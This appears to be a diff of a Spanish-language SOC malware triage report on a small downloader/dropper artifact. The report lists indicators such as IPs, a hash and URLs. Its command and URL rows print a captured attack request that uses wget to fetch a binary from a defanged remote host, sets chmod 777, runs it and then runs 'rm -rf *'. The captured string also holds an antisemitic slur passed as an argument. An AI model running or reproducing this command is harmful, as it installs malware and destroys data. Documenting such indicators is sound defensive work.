@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 440 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `nerv.arm7` en `hxxp://93.115.101.XXX:13734/nerv.arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:04:38+00:00`
+- **Registrado:** `2026-08-09T20:04:38.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,11 +54,11 @@ GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\/hxxp://93.115.101.XXX:13734/nerv.ar
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.140.XXX | static_analysis |
-| ip | 93.115.101.XXX | static_analysis |
 | url | hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;rm+-rf+* | strings |
-| hash | 1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f | static_analysis |
+| ip | 93.115.101.XXX | static_analysis |
+| ip | 190.179.140.XXX | static_analysis |
 | command | GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\/hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews; | strings |
+| hash | 1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f | static_analysis |
 | ip | 138.197.87.XXX | artifact_source |
 
 ## 🔎 Triage
